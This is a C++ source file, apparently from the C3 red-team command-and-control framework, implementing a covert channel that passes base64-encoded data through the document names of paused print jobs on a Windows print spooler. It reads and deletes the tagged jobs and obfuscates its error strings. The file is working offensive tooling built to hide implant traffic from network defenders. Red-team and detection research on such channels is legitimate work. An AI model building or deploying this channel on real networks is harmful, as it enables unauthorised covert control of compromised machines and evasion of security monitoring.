#include "Stdafx.h"
#include "Print.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include <Windows.h>
#include <Winspool.h>

namespace FSecure::C3::Interfaces::Channels
{
	using namespace FSecure::StringConversions;

	Detail::PrinterHandle Detail::PrinterHandle::Open(std::string_view printerAddress)
	{
		HANDLE handle;
		PRINTER_DEFAULTS defaults {};
		std::wstring printer = Convert<Utf16>(printerAddress);
		defaults.DesiredAccess = PRINTER_ACCESS_USE;
		if (!OpenPrinter2(printer.c_str(), &handle, &defaults, nullptr))
			throw std::runtime_error{ OBF("Can't connect to printer") };

		return { handle };
	}

	Print::Print(ByteView arguments)
		: m_inboundDirectionName{ arguments.Read<std::string>() }
		, m_outboundDirectionName{ arguments.Read<std::string>() }
		, m_jobIdentifier{ arguments.Read<std::string>() }
		, m_printerAddress{ arguments.Read<std::string>() }
		, m_maxPacketSize{ arguments.Read<uint32_t>() }
		, m_OutboudJobsLimit{ arguments.Read<uint32_t>() }
		, m_pHandle{ Detail::PrinterHandle::Open(m_printerAddress) }
	{
	}

	size_t Print::OnSendToChannel(ByteView data)
	{
		// Find out what size chunks we're able to send
		size_t sizeOfDataToWrite = CalculateDataSize(data);
		// Encode the data
		std::string dataToWrite = EncodeData(data, sizeOfDataToWrite);

		//Check if there's an existing print job waiting to be read
		if (m_OutboudJobsLimit)
		{
			auto currentJobs = GetC3Jobs(m_outboundDirectionName);
			if (currentJobs.size() >= m_OutboudJobsLimit)
				return 0;
		}

		WriteData(dataToWrite);
		return sizeOfDataToWrite;
	}

	std::vector<ByteVector> Print::OnReceiveFromChannel()
	{
		//Check if there's an existing print job waiting to be read
		auto jobs = GetC3Jobs(m_inboundDirectionName);

		std::vector<ByteVector> ret;
		for (auto&& [document, jobId] : jobs)
		{
			//Remove trailing jobIdentifierand lock, then decode the remaining data wstring
			std::string convertedData = Convert<Utf8>(document.substr(0, document.size() - m_inboundDirectionName.size() - m_jobIdentifier.size()));
			if (SetJob(m_pHandle.Get(), jobId, 0, NULL, JOB_CONTROL_DELETE) == 0)
			{
				Log({ OBF("Failed to delete job"), LogMessage::Severity::Warning });
				continue;
			}
			ret.emplace_back(base64::decode(convertedData));
		}
		return ret;
	}

	std::vector<std::tuple<std::wstring, DWORD>> Print::GetC3Jobs(std::string_view direction)
	{
		DWORD dwNeeded, dwReturned;
		// First you call EnumJobs() to find out how much memory you need
		if (!EnumJobs(m_pHandle.Get(), 0, 0xFFFFFFFF, 2, NULL, 0, &dwNeeded, &dwReturned))
		{
			// It should have failed, but if it failed for any reason other
			// than "not enough memory", you should bail out
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
				throw std::runtime_error{ OBF("Couldn't enumerate jobs") };
		}
		// Allocate enough memory for the JOB_INFO_2 structures plus
		// the extra data - dwNeeded from the previous call tells you
		// the total size needed
		auto buffer = std::make_unique<uint8_t[]>(dwNeeded);

		// Call EnumJobs() again and let it fill out our structures
		if (!EnumJobs(m_pHandle.Get(), 0, 0xFFFFFFFF, 2, buffer.get(), dwNeeded, &dwNeeded, &dwReturned))
			throw std::runtime_error{ OBF("Couldn't enumerate jobs") };

		auto* pJobInfo = reinterpret_cast<JOB_INFO_2*>(buffer.get());
		std::vector<std::tuple<std::wstring, DWORD>> ret;
		for (size_t i = 0; i < dwReturned; i++)
		{
			// skip jobs that are not paused
			if (pJobInfo[i].Status != JOB_STATUS_PAUSED)
				continue;

			std::wstring docName = pJobInfo[i].pDocument;
			if (docName.size() < direction.size() + m_jobIdentifier.size())
				continue;

			// Check that it's a C3 job
			if (docName.compare(docName.size() - m_jobIdentifier.size(), m_jobIdentifier.size(), Convert<Utf16>(m_jobIdentifier)) == 0 &&
				docName.compare(docName.size() - m_jobIdentifier.size() - direction.size(), direction.size(), Convert<Utf16>(direction)) == 0)
				ret.emplace_back(pJobInfo[i].pDocument, pJobInfo[i].JobId);
		}
		return ret;
	}

	void Print::WriteData(std::string const& dataToWrite)
	{
		std::wstring docName = Convert<Utf16>(dataToWrite + m_outboundDirectionName + m_jobIdentifier);
		DOC_INFO_1 docInfo{};
		docInfo.pDocName = docName.data();
		docInfo.pOutputFile = nullptr;
		docInfo.pDatatype = L"RAW";

		std::lock_guard lock(m_DocMutex);
		int jobId = StartDocPrinter(m_pHandle.Get(), 1, (LPBYTE)&docInfo);
		if (jobId == 0)
			throw std::runtime_error{ OBF("Couldn't write data") };

		if (SetJob(m_pHandle.Get(), jobId, 0, NULL, JOB_CONTROL_PAUSE) == 0)
		{
			EndDocPrinter(m_pHandle.Get());
			throw std::runtime_error{ OBF("Couldn't pause job") };
		}

		if (EndDocPrinter(m_pHandle.Get()) == 0)
			throw std::runtime_error{ OBF("Couldn't write data") };
	}

	size_t Print::CalculateDataSize(ByteView data)
	{
		auto trueDataSize = m_maxPacketSize - m_outboundDirectionName.size() - m_jobIdentifier.size();
		auto maxPacketSize = base64::decoded_max_size(trueDataSize);
		return std::min(maxPacketSize, data.size());
	}

	std::string Print::EncodeData(ByteView data, size_t dataSize)
	{
		auto sendData = data.SubString(0, dataSize);
		return base64::encode(sendData.data(), sendData.size());
	}

	ByteVector Print::OnRunCommand(ByteView command)
	{
		auto commandCopy = command; //each read moves ByteView. CommandCoppy is needed  for default.
		switch (command.Read<uint16_t>())
		{
		case 0:
			m_OutboudJobsLimit = command.Read<uint32_t>();
			return {};
		default:
			return AbstractChannel::OnRunCommand(commandCopy);
		}
	}

	const char* Print::GetCapability()
	{
		return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
                "type": "string",
                "name": "Job Identifier",
                "min": 1,
				"defaultValue": "C3",
                "description": "The unique string from which C3 jobs can be identified on the spooler"
            },
			{
                "type": "string",
                "name": "Printer Address",
                "min": 1,
				"defaultValue": "",
                "description": ""
            },
			{
                "type": "uint32",
                "name": "Max Packet Size",
                "min": 1,
				"defaultValue": "1048576",
                "description": "Maximum packet size (document name) that target print queue supports"
            },
			{
                "type": "uint32",
                "name": "Outbound jobs limit",
				"defaultValue": 0,
                "description": "Maximum number of jobs a channel can create simultaneously, 0 means no limit"
            }
		]
	},
	"commands":
    [
		{
			"name": "Set outbound jobs limit",
			"id": 0,
			"description": "Change the maximum number of outbound jobs a channel can create simultaneously",
            "arguments":
            [
                {
                    "type": "uint32",
                    "name": "Outbound jobs limit",
                    "defaultValue": 0,
                    "description": "Maximum number of jobs a channel can create simultaneously, 0 means no limit"
                }
            ]
		}
    ]
}
)_";
	}
}
